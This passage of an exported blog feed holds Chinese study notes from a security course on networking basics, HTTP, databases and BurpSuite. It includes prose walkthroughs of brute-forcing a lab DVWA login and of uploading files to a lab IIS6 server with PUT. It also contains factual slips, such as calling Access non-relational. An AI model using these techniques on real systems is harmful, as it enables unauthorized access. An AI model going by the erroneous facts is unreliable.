class="headerlink" title="有线局域网"></a>有线局域网</h4><p>使用各种不同的传输技术，大多使用铜线为传输介质，也使用光纤。和无线局域网相比，有线局域网的性能和稳定性更好。<br>有线局域网的拓扑结构是以点到点链路为基础，点到点链路连接到一个盒子（交换机）。俗称以太网 IEEE 802.3。</p><h3 id="局域网的常见拓扑结构"><a href="#局域网的常见拓扑结构" class="headerlink" title="局域网的常见拓扑结构"></a>局域网的常见拓扑结构</h3><h4 id="星形"><a href="#星形" class="headerlink" title="星形"></a>星形</h4><p>网络中的每一个节点设备都以中心结为中心，通过连接线与中心节点相连。<br>中心节点是控制中心，任意两个节点间的通信最多只需两步，所以传输速度快，网络结构简单、建网容易、便于控制管理。<br>稳定性差，共享能力低，并且中心节点如果出现问题整个网络会全面瘫痪。</p><h4 id="树形"><a href="#树形" class="headerlink" title="树形"></a>树形</h4><p>天然的分级结构，分级的集中式网络。<br>特点：成本低，结构简单。任意两个节点之间不产生回路，每个链路都支持双向传输，网络中节点扩充方便、灵活，巡查链路路径简单。<br>除叶节点及其相连的链路外，任何一个工作站或链路产生故障会影响整个网络的正常运行。</p><h4 id="总线形"><a href="#总线形" class="headerlink" title="总线形"></a>总线形</h4><p>将各个节点设备和一根总线相连。网络中所有节点工作站都是通过总线进行信息传输。<br><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190824011319086.png" alt></p><h4 id="环形"><a href="#环形" class="headerlink" title="环形"></a>环形</h4><p>网络中各个节点通过一条首尾相连的通信链路连接起来的一个闭合环形结构网。<br>系统中各个工作站地位相等。系统中通信设备和线路相对节省。<br>网络中信息设有固定单向流动，两个工作站节点之间仅有一条通路，系统中无信道选择问题。某个节点的故障价格导致物理瘫痪。由于环路封闭，不便于扩充，系统响应延时长，信息传输效率相对较低。</p><h2 id="互联网-WAN"><a href="#互联网-WAN" class="headerlink" title="互联网(WAN)"></a>互联网(WAN)</h2><p>Internet，又称传媒领域。是网络与网络之间串联成的庞大网络。网络之间以通用的协议相连，形成逻辑上的单一巨大国际网络。<br>互联网不同于万维网，万维网只是基于超文本相互链接形成的全球系统，只是互联网提供服务中的一种。</p><h4 id="网络数据的传输"><a href="#网络数据的传输" class="headerlink" title="网络数据的传输"></a>网络数据的传输</h4><p>数据在计算机之间传输，需要两个前提：<br>1。数据传输的地址（IP）<br>2。保证数据有效传输的协议（TCP）<br>TCP/IP协议：采用的是分组交换方式。在传输中分成若干段，每个数据段称为一个数据包。<br>TCP/IP协议主要包括两个协议：TCP协议和IP协议</p><h4 id="互联网、因特网、万维网"><a href="#互联网、因特网、万维网" class="headerlink" title="互联网、因特网、万维网"></a>互联网、因特网、万维网</h4><p>互联网包含因特网，因特网包含万维网，凡是能彼此通信的设备组成的网络就叫互联网。<br>因特网是基于TCP/IP协议实现的，TCP/IP协议由很多协议组成，不同协议被放在不同的层。</p><h1 id="OSI网络分层"><a href="#OSI网络分层" class="headerlink" title="OSI网络分层"></a>OSI网络分层</h1><p>OSI（Open System Interconnection）开放式系统互联。一共分七层，定义不同计算机互联标准是设计和描述计算机通信的基本框架。现常使用五层模型结构，将应用层、表示层、会话层统称第五层应用层。<br><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190824013633881.png" alt><br><em>小知识：高锟，光纤之父中国人</em></p><h2 id="常见的网络协议和所在的网络层"><a href="#常见的网络协议和所在的网络层" class="headerlink" title="常见的网络协议和所在的网络层"></a>常见的网络协议和所在的网络层</h2><p><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190824013819283.png" alt><br>网络协议：计算机网络中互相通信的对等实体之间交换信息时必须遵守的规则的集合。<br><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190824022048342.png" alt></p><h3 id="网络协议的三个组成要素"><a href="#网络协议的三个组成要素" class="headerlink" title="网络协议的三个组成要素"></a>网络协议的三个组成要素</h3><p>1。语义：解释控制信息每个部分的意义。<br>2。语法：用户数据与控制信息的结构与格式，以及数据出现的顺序。<br>3。时序：对事件发生顺序的详细说明。</p><h3 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h3><p>网络协议是网络上所有设备（网络服务器、计算机及交换机、路由器、防火墙等）之间通信规则的集合，规定了通信是信息必须采用的格式和这些格式的意义。<br>大多数网络采用的是分层体系结构，每一层都建立在它的下层之上，向它的上一层提供一定的服务。在网络中各层中存在着许多协议，接收方和发送放同层的协议必须一致，否则无法进行有效通信。<br>常见的协议：TCP/IP协议、IPX/SPX协议、NetBEUI协议等</p><h3 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h3><p>1。结构中的每一层都规定有明确的服务及接口标准<br>2。把用户的应用程序作为最高层<br>3。除了最高层，中间的每一层都向上一层提供服务，同时又是下一层的用户<br>4。物理通信线路作为最底层，使用从最高层传送来的参数。是提供服务的基础</p><h2 id="常见的协议（这里使用的是五层OSI模型）"><a href="#常见的协议（这里使用的是五层OSI模型）" class="headerlink" title="常见的协议（这里使用的是五层OSI模型）"></a>常见的协议（这里使用的是五层OSI模型）</h2><h3 id="PPTP（Point-to-Point-Tunneling-Protocol）"><a href="#PPTP（Point-to-Point-Tunneling-Protocol）" class="headerlink" title="PPTP（Point to Point Tunneling Protocol）"></a>PPTP（Point to Point Tunneling Protocol）</h3><p>点对点隧道协议，支持多协议虚拟专用网络（VPN），可以通过密码验证协议（PAP），可扩展认证协议（EAP）等方法增强安全性<br><strong>默认端口号：1723</strong><br><strong>第二层协议</strong></p><h3 id="L2TP（Layer-Two-Tunneling-Protocol）"><a href="#L2TP（Layer-Two-Tunneling-Protocol）" class="headerlink" title="L2TP（Layer Two Tunneling Protocol）"></a>L2TP（Layer Two Tunneling Protocol）</h3><p>一种虚拟隧道协议，虚拟网络专用。L2TP协议自身不提供加密与可靠性验证功能，可以和安全协议（IPsec）搭配使用。实现数据的加密传输。<br><strong>默认端口号：使用UDP注册端口 1701</strong><br><strong>第二层协议</strong></p><h4 id="PPTP与L2TP区别"><a href="#PPTP与L2TP区别" class="headerlink" title="PPTP与L2TP区别"></a>PPTP与L2TP区别</h4><table><thead><tr><th>PPTP</th><th>L2TP</th></tr></thead><tbody><tr><td>要求互联网为IP网络</td><td>之要求隧道媒介提供面向数据包的点对点连接</td></tr><tr><td>只能在两端点之间建立单一隧道</td><td>支持在两端点之间使用多隧道</td></tr><tr><td>压缩包头，系统开销占用6字节</td><td>压缩包头，系统开销占用4字节</td></tr><tr><td>提供隧道认证</td><td>不提供隧道认证，L2TP和IPsec共同使用时可有IPsec提供隧道认证</td></tr></tbody></table><h3 id="Socks5-代理"><a href="#Socks5-代理" class="headerlink" title="Socks5 代理"></a>Socks5 代理</h3><p>只是简单的传递数据包，不关心是和种应用协议。为客户端到服务端之间的数据进行联系，提供安全服务。对TCP/IP的高级协议加以管制。Eg：Telnet、FTP、HTTP、SMTP等<br><strong>默认端口：1080</strong><br><strong>第五层协议</strong></p><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p>超文本传输协议。HTTP代理，代理客户机的HTTP访问，主要代理浏览器访问网页。<br><strong>默认端口：80、8080、3128等</strong></p><h4 id="Socks和HTTP区别"><a href="#Socks和HTTP区别" class="headerlink" title="Socks和HTTP区别"></a>Socks和HTTP区别</h4><table><thead><tr><th>Socks</th><th>HTTP</th></tr></thead><tbody><tr><td>只是简单的传递数据包，不关心是何种应用协议</td><td>工作在应用层</td></tr></tbody></table><p>Socks4：只支持TCP协议<br>Socks5：支持TCP、UDP、身份验证、服务器端口域名解析等</p><h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><p>面向无连接的协议，用于传输错误报告控制信息，主要用于主机与路由器之间传递控制信息，错误报告，交换受限控制和状态信息等。和IP协议、ARP协议、RARP协议、IGMP共同构成TCP/IP模型中的网络层。<br><strong>第三层协议</strong></p><h4 id="Ping（Packet-Internet-Groper）"><a href="#Ping（Packet-Internet-Groper）" class="headerlink" title="Ping（Packet Internet Groper）"></a>Ping（Packet Internet Groper）</h4><p>Ping是TCP/IP协议的一部分，检测网络是否畅通。发送一个ICMP（Internet Control Messages Protocol）因特信报控制协议，回声请求消息给目的地并报告是否受到锁心往的ICMPecho（ICMP回声应答）</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第六周 </tag>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite使用简介</title>
      <link href="/2019/08/23/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/"/>
      <url>/2019/08/23/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p>以火狐为例</p><h1 id="1。设置代理"><a href="#1。设置代理" class="headerlink" title="1。设置代理"></a>1。设置代理</h1><p><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081533269.png" alt><br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081538189.png" alt></p><h1 id="2。设置BurpSuite，端口和浏览器一致"><a href="#2。设置BurpSuite，端口和浏览器一致" class="headerlink" title="2。设置BurpSuite，端口和浏览器一致"></a>2。设置BurpSuite，端口和浏览器一致</h1><p><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081627457.png" alt><br>如果抓包后不能上网，显示证书问题，就下载证书安装<br>登陆127.0.0.1：8080这个是浏览器的设置<br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823083603385.png" alt><br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823083441584.png" alt></p><h1 id="3。使用"><a href="#3。使用" class="headerlink" title="3。使用"></a>3。使用</h1><p><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081636168.png" alt></p><h1 id="4。爬虫"><a href="#4。爬虫" class="headerlink" title="4。爬虫"></a>4。爬虫</h1><p><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081657190.png" alt><br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081701952.png" alt><br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081718863.png" alt></p><h1 id="5。便捷修改数据包的传输方式"><a href="#5。便捷修改数据包的传输方式" class="headerlink" title="5。便捷修改数据包的传输方式"></a>5。便捷修改数据包的传输方式</h1><p><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081752742.png" alt></p><h1 id="6。关于插件问题"><a href="#6。关于插件问题" class="headerlink" title="6。关于插件问题"></a>6。关于插件问题</h1><p>有些插件需要安装jpython，在插件配置进行设置<br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823083903854.png" alt><br>一些插件可以从商店下载，但大部分精华需要自己根据需要编写插件。语言使用java或jpython</p><h1 id="7。项目保存"><a href="#7。项目保存" class="headerlink" title="7。项目保存"></a>7。项目保存</h1><p><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823084133751.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第六周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite爆破模块</title>
      <link href="/2019/08/23/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/"/>
      <url>/2019/08/23/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>1。目标是搭建的DVWA<br>2。工具使用BurpSuite,火狐（设置代理配置）</p><h1 id="BurpSuite的爆破模式"><a href="#BurpSuite的爆破模式" class="headerlink" title="BurpSuite的爆破模式"></a>BurpSuite的爆破模式</h1><table><thead><tr><th>模式</th><th>特点</th></tr></thead><tbody><tr><td>Sniper(阻击手)</td><td>只能设置一个Payload，一个一个进行尝试<br>如果设置两个，就一个执行另一个不执行</td></tr><tr><td>Battering ram（攻城锤）</td><td>只能设置一个Payload，和阻击手差不多<br>如果设置两个，就同步爆破</td></tr><tr><td>Pitchfork（草叉）</td><td>随着设置的变量个数确定Payload，按照顺序一一对应尝试破解<br>123；456   1-4  2-5  3-6</td></tr><tr><td>Cluster bomb（集束炸弹）</td><td>笛卡尔积，排列组合尝试破解</td></tr></tbody></table><h1 id="从DVWA的low级开始爆破"><a href="#从DVWA的low级开始爆破" class="headerlink" title="从DVWA的low级开始爆破"></a>从DVWA的low级开始爆破</h1><p>1。登陆抓包<br>2。对抓包数据分析，发送到Repeater进行修改验证<br><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823075356299.png" alt><br>3。可以修改发送到Intruder进行爆破<br>4。选择爆破模式<br><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080129394.png" alt><br>5。根据爆破信息查找密码<br><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080158571.png" alt></p><pre><code>正常登陆成功或失败会有跳转，3xx开头的状态码值得关注length报文的长度寻找最独特的，大概率会找到如果破解带有token的报文需要对token进行随机数处理。因为token在进行一次登陆验证后就会失效。</code></pre><p>6。报文变量的设置<br><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080514148.png" alt><br>7。爆破密码的窗口<br><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080528590.png" alt></p><h1 id="DVWA的high等级的爆破尝试"><a href="#DVWA的high等级的爆破尝试" class="headerlink" title="DVWA的high等级的爆破尝试"></a>DVWA的high等级的爆破尝试</h1><p>因为DVWA的high等级登陆包含token所以对爆破进行相关设置<br>1。选择草叉模式<br><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080734033.png" alt><br>2。设置一个线程<br><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080752983.png" alt><br>3。设置Payload、枚举随机数和token的设置<br><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080808293.png" alt><br><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080829581.png" alt><br><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080849673.png" alt><br>4。进行爆破效果<br><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080913451.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第六周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ii6 put文件上传漏洞</title>
      <link href="/2019/08/23/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/23/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h1><p>1。自己搭建网站，使用winserver2003<br>2。给网站相关权限<br>3。BurpSuite抓包分析</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="尝试的ii7-put"><a href="#尝试的ii7-put" class="headerlink" title="尝试的ii7 put"></a>尝试的ii7 put</h2><p>1。使用OPTIONS获取网站的相关信息<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074329520.png" alt><br>2。尝试写入文件<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074411531.png" alt><br>写入失败，尝试Burp抓包查看</p><p>将ii7更换ii6再次尝试<br>使用Netcat获取网站信息<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074710221.png" alt><br>BurpSuite抓包，OPTIONS获取网站信息<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074518565.png" alt><br>尝试put写入<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074630072.png" alt><br>成功写入<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074645105.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第六周 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议的状态码</title>
      <link href="/2019/08/23/HTTP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%8A%B6%E6%80%81%E7%A0%81/"/>
      <url>/2019/08/23/HTTP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%8A%B6%E6%80%81%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="状态码分类"><a href="#状态码分类" class="headerlink" title="状态码分类"></a>状态码分类</h1><h2 id="1-5百系列的大致含义"><a href="#1-5百系列的大致含义" class="headerlink" title="1~5百系列的大致含义"></a>1~5百系列的大致含义</h2><p>1xx：提示信息——表示请求以接受，继续处理<br>2xx：成功——请求已被成功接收、解析、接受<br>3xx：重定向——要完成请求必须进行更进一步的操作<br>4xx：客户端错误——请求错误或无法实现<br>5xx：服务端错误——服务器未能实现请求</p><h2 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h2><p>注释：常见状态码：</p><table><thead><tr><th>状态码</th><th>含义</th></tr></thead><tbody><tr><td>200 OK</td><td>客户端请求成功</td></tr><tr><td>400 Bad Request</td><td>客户端请求有语法错误，不能被服务器所理解</td></tr><tr><td>401 Unauthorized</td><td>请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</td></tr><tr><td>403 Forbidden</td><td>服务器收到请求，但是拒绝提供服务</td></tr><tr><td>404 Not Found</td><td>请求资源不存在，eg：输入了错误的URL</td></tr><tr><td>500 Internal Server Error</td><td>服务器发生不可预期的错误</td></tr><tr><td>503 Server Unavailable</td><td>服务器当前不能处理客户端的请求，一段时间后可能恢复正常</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第六周 </tag>
            
            <tag> HTTP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URI、URL、URN</title>
      <link href="/2019/08/23/URI%E3%80%81URL%E3%80%81URN/"/>
      <url>/2019/08/23/URI%E3%80%81URL%E3%80%81URN/</url>
      
        <content type="html"><![CDATA[<h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><p>URL统一资源定位符，是Internet上资源的地址，可以定义为引用地址的字符串，用于指定资源的位置以及用于访问他的协议。<br>URL网络上定位资源最普遍的使用方式，提供了一种通过描述网络位置或主要访问机制来检索物理位置的方法。</p><h2 id="URL包含信息"><a href="#URL包含信息" class="headerlink" title="URL包含信息"></a>URL包含信息</h2><p>1。访问资源的协议<br>2。服务器的位置（IP或域名）<br>3。服务器端口（可选）<br>4。资源在服务器目录结构中的位置<br>5。锚</p><h1 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h1><p>URI（Univeral Resource Identifier）：统一资源标识符，标识逻辑或物理资源的字符序列，与URL类似，也是一串字符串，通常使用位置、名称或两者标识Internet上的资源；允许统一识别资源。</p><h2 id="URI有两种类型：URL（统一资源标识符）、URN-统一资源名称"><a href="#URI有两种类型：URL（统一资源标识符）、URN-统一资源名称" class="headerlink" title="URI有两种类型：URL（统一资源标识符）、URN(统一资源名称)"></a>URI有两种类型：URL（统一资源标识符）、URN(统一资源名称)</h2><p>任何URI的通用形式都是：</p><pre><code>scheme:[// [user:password @] host [:port]] [/] path [? 查询] [#锚]scheme： 具体语法和URI的任何相关协议。方案不区分大小写，后跟 ： 。user:password：身份验证@：后跟主机名[:port]：端口号[? 查询]：可选，语法没有明确定义，通常由分割符的属性值对序列。使用 &amp; 连接参数[#锚]：可选，为辅助资源提供方向</code></pre><h1 id="URN"><a href="#URN" class="headerlink" title="URN"></a>URN</h1><p>URN是URI的一种，用特定命名空间的名字标识资源。使用URN可以在不知其网络位置及访问方式的情况下查找资源</p><h1 id="URL和URI的主要区别"><a href="#URL和URI的主要区别" class="headerlink" title="URL和URI的主要区别"></a>URL和URI的主要区别</h1><h2 id="1。作用区别"><a href="#1。作用区别" class="headerlink" title="1。作用区别"></a>1。作用区别</h2><p>URL主要用于连接网页，网页组件或网页上的程序，通过访问协议（http、ftp等）来检索位置资源<br>URI用于定义项目的标识</p><h2 id="2。URL是URI的子集"><a href="#2。URL是URI的子集" class="headerlink" title="2。URL是URI的子集"></a>2。URL是URI的子集</h2><h2 id="3。协议区别"><a href="#3。协议区别" class="headerlink" title="3。协议区别"></a>3。协议区别</h2><p>URL指定要使用的协议类<br>URI不涉及协议规范</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第六周 </tag>
            
            <tag> HTTP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP与HTTPS的区别</title>
      <link href="/2019/08/23/HTTP/"/>
      <url>/2019/08/23/HTTP/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h1><p>HTTP（Hyper Text Transfer Protocol）：超文本传输协议<br>HTTPS：是一种通过计算机网络安全通信的传输协议，HTTPS是身披SSL外壳的HTTP。经由HTTP进行通信，利用SSL/TLS建立全信道，加密数据包。HTTPS主要是提供对网站服务器的身份认证，同时保护提数据的隐蔽与完整性。</p><h2 id="HTTP特点"><a href="#HTTP特点" class="headerlink" title="HTTP特点"></a>HTTP特点</h2><p>1。简单快速：只需传送方法和请求。<strong>常用请求方式：GET、HEAD、POST</strong><br>2。允许传输任意类型的数据对象。<strong>Content-Type</strong><br>3。无连接：每次连接只处理一个请求，服务器完成客户端的请求并接受客户端应答后断开。<br>4。无状态：HTTP协议是无状态的协议<br>5。支持B/S和C/S模式</p><h6 id="HTTPS是在HTTP的基础上加了一层SSL的加密协议对传输的信息进行加密。"><a href="#HTTPS是在HTTP的基础上加了一层SSL的加密协议对传输的信息进行加密。" class="headerlink" title="HTTPS是在HTTP的基础上加了一层SSL的加密协议对传输的信息进行加密。"></a>HTTPS是在HTTP的基础上加了一层SSL的加密协议对传输的信息进行加密。</h6><h2 id="HTTP协议常见头部信息"><a href="#HTTP协议常见头部信息" class="headerlink" title="HTTP协议常见头部信息"></a>HTTP协议常见头部信息</h2><p>Accept：浏览器可接受的MIME类型<br>Accept-Charest：浏览器可接受的字符集<br>Accept-Encoding：浏览器能够进行解码的数据编码方式<br>Accept-Language：浏览器所希望的语言种类<br>Authorization：授权信息<br>Connection：是否需要持久连接，Keep-Alive 持久连接。或者请求使用的是HTTP1.1（默认进行持久连接）当页面包含多个元素时（如：视频、音频等）<br>Content-Length：请求消息正文的长度<br>Cookie：电脑中的cookie从服务器相应头中，set-cookie来的<br>Host：初始URL中的主机和端口<br>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回<br>Pragma：指定“no-cache”值服务器必须返回一个刷新后的文档<br>Referer:验证请求来源<br>User-Agent：浏览器类型</p><h2 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h2><p>GET：检索URI中标识资源的一个简单请求<br>HEAD：与GET相同，只是服务器只返回状态行和头部，并不返回请求文档<br>POST：服务器接受被写入客户端流出的数据请求<br>PUT：向web服务器发送数据并存储在web服务器内<br>DELETE：从web服务器上删除一个文件<br>TRACE：跟踪服务器路径<br>OPTIONS：查询web服务器的信息</p><h2 id="MIMI文档格式"><a href="#MIMI文档格式" class="headerlink" title="MIMI文档格式"></a>MIMI文档格式</h2><p>通用类型：</p><table><thead><tr><th>类型</th><th>格式</th></tr></thead><tbody><tr><td>超文本标记语言文本</td><td>.html text/html</td></tr><tr><td>xml文档</td><td>.xml text/xml</td></tr><tr><td>XHTML文档</td><td>.xhtml application/xhtml+xml</td></tr><tr><td>普通文本</td><td>.txt text/plain</td></tr><tr><td>RTF文本</td><td>.rtf application/rtf</td></tr><tr><td>PDF文档</td><td>.pdf application/pdf</td></tr><tr><td>Microsoft</td><td>Word文件 .word application/msword</td></tr><tr><td>PNG图像</td><td>.png image/png</td></tr><tr><td>GIF图形</td><td>.gif image/gif</td></tr><tr><td>JPEG图形</td><td>.jpeg,.jpg image/jpeg</td></tr><tr><td>au声音文件</td><td>.au audio/basic</td></tr><tr><td>MIDI音乐文件</td><td>mid,.midi audio/midi,audio/x-midi</td></tr><tr><td>RealAudio音乐文件</td><td>.ra, .ram audio/x-pn-realaudio</td></tr><tr><td>MPEG文件</td><td>.mpg,.mpeg video/mpeg</td></tr><tr><td>AVI文件</td><td>.avi video/x-msvideo</td></tr><tr><td>GZIP文件</td><td>.gz application/x-gzip</td></tr><tr><td>TAR文件</td><td>.tar application/x-tar</td></tr><tr><td>任意的二进制数据</td><td>application/octet-stream</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第六周 </tag>
            
            <tag> HTTP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见数据库</title>
      <link href="/2019/08/22/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2019/08/22/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h1><p>采用了关系模型来组织的数据库，其以行和列的形式存储数据，便于理解。一系列的行和列被称为表，一组表构成了数据库。关系型数据库可以简单的理解为二维表个模型，一个关系型数据库就是由二维表及其之间的关系组成的一个数据组织。</p><h4 id="代表：MySQL"><a href="#代表：MySQL" class="headerlink" title="代表：MySQL"></a>代表：MySQL</h4><h1 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h1><p>非关系型、分布式，强调键值对。是大量结构化数据存储方式的集合。</p><h4 id="代表：Access"><a href="#代表：Access" class="headerlink" title="代表：Access"></a>代表：Access</h4><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1、面向检索的列存储式（Column-Oriented）"><a href="#1、面向检索的列存储式（Column-Oriented）" class="headerlink" title="1、面向检索的列存储式（Column-Oriented）"></a>1、面向检索的列存储式（Column-Oriented）</h3><p>其存储结构为列式结构，通于关心型数据库的行式结构。</p><h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><p>统计聚合操作方便，系统具有较高的可扩展性。适应海量数据的增加以及数据结构的变化，适合云计算。</p><h4 id="代表："><a href="#代表：" class="headerlink" title="代表："></a>代表：</h4><p>Big Table、HaBase</p><h3 id="2、面向高性能并发读-写的缓存存储（Key-Value）"><a href="#2、面向高性能并发读-写的缓存存储（Key-Value）" class="headerlink" title="2、面向高性能并发读/写的缓存存储（Key-Value）"></a>2、面向高性能并发读/写的缓存存储（Key-Value）</h3><p>结构类似于数据结构中的Hash表，每个Key分别对应一个Value</p><h4 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h4><p>能够提供快速的查询速度、大数据存放量和高并发操作，非常适合通过主键对数据进行增删该查。</p><h4 id="代表：-1"><a href="#代表：-1" class="headerlink" title="代表："></a>代表：</h4><p>MemcacheDB、BerKeleyDB、Redis、Flare（Key—Value数据库的代表）</p><h3 id="3、面向海量数据访问的文档存储（Document-Oriented）"><a href="#3、面向海量数据访问的文档存储（Document-Oriented）" class="headerlink" title="3、面向海量数据访问的文档存储（Document-Oriented）"></a>3、面向海量数据访问的文档存储（Document-Oriented）</h3><p>和Key-Value非常类似，但这个Value主要以JSON或XML等各式的文档进行存储。</p><h4 id="特点：-2"><a href="#特点：-2" class="headerlink" title="特点："></a>特点：</h4><p>方便面箱对象的语言使用，可在海量数据中快速查询数据。</p><h4 id="代表：-2"><a href="#代表：-2" class="headerlink" title="代表："></a>代表：</h4><p>MongoDB、CouchDB等</p><h2 id="关系数据库和非关系数据库的区别"><a href="#关系数据库和非关系数据库的区别" class="headerlink" title="关系数据库和非关系数据库的区别"></a>关系数据库和非关系数据库的区别</h2><table><thead><tr><th>数据库类型</th><th>关系数据库</th><th>非关系数据库</th></tr></thead><tbody><tr><td>特点</td><td>1.使用关系组织数据库 